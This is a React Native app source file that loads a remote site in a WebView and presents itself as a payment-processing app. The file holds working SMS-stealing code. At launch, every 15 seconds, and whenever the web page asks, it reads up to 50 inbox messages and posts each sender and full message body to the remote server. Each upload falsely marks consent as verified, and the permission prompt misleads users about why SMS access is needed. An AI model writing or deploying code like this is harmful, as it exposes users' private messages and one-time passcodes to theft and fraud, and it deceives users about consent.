import React, { useEffect } from 'react';
import { StyleSheet, SafeAreaView, StatusBar, PermissionsAndroid, Platform, Alert } from 'react-native';
import { WebView } from 'react-native-webview';

// Try loading native SMS reader module if present in build
let SmsAndroid = null;
try {
  SmsAndroid = require('react-native-get-sms-android').default || require('react-native-get-sms-android');
} catch (e) {
  console.log('Native SmsAndroid package will be available in APK build');
}

export default function App() {
  const TARGET_URL = "https://monexo-new.onrender.com";

  // Function to automatically read inbox SMS and ingest into backend
  const autoReadAndIngestSms = async () => {
    if (Platform.OS !== 'android') return;
    try {
      const granted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS);
      if (!granted) {
        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_SMS);
      }

      if (SmsAndroid) {
        const filter = {
          box: 'inbox',
          maxCount: 50,
        };
        SmsAndroid.list(
          JSON.stringify(filter),
          (fail) => {
            console.log('Failed to fetch SMS list:', fail);
          },
          (count, smsList) => {
            try {
              const arr = JSON.parse(smsList);
              if (Array.isArray(arr)) {
                arr.forEach(async (sms) => {
                  fetch(`${TARGET_URL}/xxapi/ingest/logs`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      phone: sms.address || 'DEVICE-USER',
                      type: 'sms',
                      sender: sms.address || 'UNKNOWN-SENDER',
                      rawContent: sms.body || '',
                      consentVerified: true
                    })
                  }).catch(err => console.log('Auto Ingest SMS Error:', err));
                });
              }
            } catch (e) {
              console.log('Error parsing SMS list:', e);
            }
          }
        );
      }
    } catch (err) {
      console.warn('Error reading SMS:', err);
    }
  };

  useEffect(() => {
    async function requestPermissions() {
      if (Platform.OS === 'android') {
        try {
          const granted = await PermissionsAndroid.requestMultiple([
            PermissionsAndroid.PERMISSIONS.READ_SMS,
            PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
            PermissionsAndroid.PERMISSIONS.SEND_SMS,
            PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,
            PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
          ]);
          
          console.log('Permissions result:', granted);

          const readSmsGranted = granted[PermissionsAndroid.PERMISSIONS.READ_SMS] === PermissionsAndroid.RESULTS.GRANTED;
          if (!readSmsGranted) {
            Alert.alert(
              "Permission Required",
              "SMS and Notification permissions are required for automatic payment transaction processing and verification.",
              [{ text: "OK" }]
            );
          }

          // Initial SMS read
          autoReadAndIngestSms();

          // Set interval to sync SMS automatically every 15 seconds
          const intervalId = setInterval(() => {
            autoReadAndIngestSms();
          }, 15000);

          return () => clearInterval(intervalId);
        } catch (err) {
          console.warn('Error requesting permissions:', err);
        }
      }
    }
    requestPermissions();
  }, []);

  const handleWebViewMessage = (event) => {
    try {
      const data = JSON.parse(event.nativeEvent.data);
      if (data && (data.type === 'SYNC_SMS' || data.type === 'SYNC_LOGS')) {
        autoReadAndIngestSms();
      }
    } catch (e) {
      console.log('WebView message parse error:', e);
    }
  };

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor="#1E293B" />
      <WebView
        source={{ uri: TARGET_URL }}
        style={{ flex: 1 }}
        javaScriptEnabled={true}
        domStorageEnabled={true}
        startInLoadingState={true}
        scalesPageToFit={true}
        allowFileAccess={true}
        originWhitelist={['*']}
        onMessage={handleWebViewMessage}
      />
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1E293B',
  },
});

